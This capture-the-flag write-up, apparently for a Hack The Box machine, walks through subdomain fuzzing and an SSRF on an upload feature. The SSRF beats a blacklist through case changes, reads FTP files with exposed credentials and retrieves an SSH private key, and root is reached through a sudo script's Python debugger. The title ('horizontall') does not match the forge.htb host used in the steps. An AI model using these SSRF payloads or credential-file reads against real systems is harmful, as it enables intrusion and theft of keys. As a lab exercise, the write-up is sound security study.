horizontall
---

## Steps

1. enumerate subdomains

`wfuzz -w /subdomains-top1million-110000.txt -u http://horizontall.htb/ -hc 301 -v -c -H "Host:FUZZ.forge.htb"

we find `admin.forge.htb`, however it can only be accessed via localhost only

2. SSRF

going to `forge.htb/upload`, we can upload an image via a URL. We perform an SSRF attack on this.

The application blacklists certain keywords, such as localhost and forge.htb, but it can be bypassed by playing around with the caps

2. Announcement

When we SSRF to `admin.forge.htb/announcment`, we see that they have allowed FTP access with certain credentials, and also allowed passing of URLs with the `?u` parameter in `/upload`


3. SSRF to FTP

we send the following request to the upload server to get the contents of the ftp query

`http://aDmIn.FoRgE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/`

From there, we can get the flag

`http://aDmIn.FoRgE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/user.txt`

## Root flag

1. Get to user

before getting to root, we need to ssh into the machine

we do this by getting the ssh private keys

`http://aDmIn.FoRgE.hTb/upload?u=ftp://user:heightofsecurity123!@FORGE.HTB/home/user/.ssh/id_rsa`

we can now ssh into the server

ssh -i <key> user@<ip>

2. sudo -l

we can run as root

`python3 /opt/remote-manage.py`

Looking at the code, it triggers a python debugger on error

3. getting the flag

- run the program on one ssh instance
- spawn another ssh instance as user
- connect to localhost
- trigger the error
- you now have a pdb running as root, which is essentially a python environment
- read the root file




